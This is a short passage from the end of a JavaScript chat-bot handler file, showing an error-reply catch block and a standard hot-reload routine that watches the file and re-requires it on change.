        }
        

    } catch (err) {
        m.reply(util.format(err))
    }
}


let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Update ${__filename}`))
	delete require.cache[file]
	require(file)
})
